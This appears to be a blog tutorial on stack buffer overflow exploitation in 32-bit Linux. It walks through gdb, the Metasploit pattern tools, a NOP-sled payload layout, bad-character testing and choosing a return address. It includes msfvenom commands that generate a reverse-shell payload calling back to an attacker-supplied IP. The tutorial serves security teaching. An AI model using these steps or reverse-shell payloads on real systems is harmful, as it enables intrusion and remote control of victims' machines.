# Buffer Overflow

From here I'm assuming that you already know a bit about ASM (```mov```, ```call```, ```lea```...). If you don't there is a good introduction in [here](https://cloud.isi.insa-cvl.fr/s/qWmEqLkSGXnkLZn).

So basicaly, the buffer overflow attack apear when you don't pay attention to the user input and that he gives you a greater input that what you expected. This surplus, will overwrite the memory.

We need to keep in mind the endianness of the program. If for example, we have a word ```\xAA\xBB\xCC\xDD``` at the address ```0xffff0000```, then depending on the endianness the word will be read differently :

| Memory Address | 	0xffff0000 | 	0xffff0001 | 	0xffff0002 | 	0xffff0003 |
|---|---|---|---|---|
| Big-Endian 	|AA | 	BB | 	CC | 	DD |
| Little-Endian | 	DD | 	CC | 	BB | 	AA |

What we would like to do is to give a greater input than the one expected so that we overwrite the return of the program. Thanks to that, we will be able to call another function or something else in the memory. Here is an image that shows basically what we want to do :

![image](https://user-images.githubusercontent.com/73934639/206201166-ef62b19e-10da-4ae2-a3b5-d7139375b54f.png){: width="300" height="100" }

At first, we will try to find the main function and its address. For that, we can use gdb or radar2. I will continue this explanation using gdb syntax but it is basically the same on r2. We will run the program until we get to the input part, when we get there we can input a large number of ```A``` and if we inputed enought A, we should get a :
```sh
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

The ```41``` are the hexadecimal value of ```A```. Now that we know that we overwrote the return address we need to find how much ```A``` we need to input before getting a segmentation fault. We can use the ```pattern_offset``` tool of ```metasploit``` to generate a random string of certain length so we don't have a bunch of ```41``` in the memory. We can use it as follows:
```sh
pattern_create.rb -l 1200
```

> This program should be in the ```metasploit-framework``` folder. On my computer it is located at ```/usr/share/metasploit-framework/tools/exploit/pattern_create.rb```.
{: .prompt-info }

We can use the gdb command to find the address of ```EIP``` (respectively ```RIP``` depending on the architecture) :
```sh
info registers eip
```

With this information you can use the metasploit ```pattern_offset.rb``` tool to find the exact offset. Or if you are good in ASM you can look what is the length of the word you give in input. You can use the tool as follows (where 0xaabbccdd is the address of eip you found earlier):
```pattern_offset.rb -q 0xaabbccdd```

> You can find ```pattern_offset.rb``` in ```/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb```.
{: .prompt-info}

We will assume that we have an offset of 64 for the rest of the demonstration. Now we can run the program again with the offset length as input and 4 bytes of "B"s. 4 is the size of the address. Here is an example:
```sh
"A" * 64 + "B"*4
```

You can use this python command to generate your strings: 
```sh
python -c "print 'A' * 64 + 'B' * 4"
```

With this input we should only have the 4 "B"s as EIP address like:
```sh
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

For this first part of BOF, we will use [msfvenom](https://www.kali.org/tools/metasploit-framework/#msfvenom). To use it to create a payload, we can use the following command:
```sh
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP lport=PORT --platform linux --arch x86 --format python
```

> Don't forget to replace ```IP``` with yours. Same for the ```PORT```.
{: .prompt-tip}

Now if this is too long you can change it to a simple shell instead of a reverse one.
The composition of our final payload will be:
```
Buffer = "C" * (64 - 10 - 40 - 4) = 10
NOPs = "\x90" * 10
Shellcode = "A" * 40
EIP = "B" * 4
```
> ```\x90``` is the hexadecimal value of the ```NOP``` instruction. {: .prompt-tip}

## Bad Characters

Your payload may not work because of some ```Bad Characters```. They are generaly ```\x00``` (Null byte),```\x0A``` (Line Feed),```\x0D``` (Carriage Return),```\xFF``` (Form Feed).

Here is the list of all chars from ```\x00``` to ```\xFF```:
```sh
"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```
You can remove the NOPs and the shellcode from the previous payload and replace them by this list. If the list is too long (256 chars) you can do it multiple time with different parts of the list. Now you can set a breakpoint just after the input so that we can analyse the memory. When the program hits the breakpoint, we can look at the ```EIP``` like that ```x/2000xb $esp+500```. We will see a bunch of ```0x43``` (our "C"s). At the end of our "C"s we should see the characters of our previous list. If a character isn't printed out, it means that it is a bad character. You can repeat those steps until you removed all the bad characters.

> Don't forget to change the number of "C"s when you remove a character from the list. The number of "C"s should increase by one each time you remove a bad character.{:.prompt-warning}

You can now use the previous ```msfvenom``` command specifying all bad characters:
```sh
msfvenom -p linux/x86/shell_reverse_tcp lhost=IP lport=PORT  --arch x86 --platform linux --format python --bad-chars "\x00\x09\x0a"
```

## Identification of the Return Address

Now we should replace our 4 "B"s by the address of our shellcode. For that we need to analyse the memory. We can do so like:
```sh
x/2000xb $esp+1400
```

We will where our NOPs (```0x90```) end and where our shellcode begins. For example, if the NOPs end at ```0xffffaabb```, then we will replace our 4 "B"s by ```\xbb\xaa\xff\xff```. To be more accurate we can chose an address that is full of NOP a bit before ```0xffffaabb```like ```0xffffaaaa``` for example.
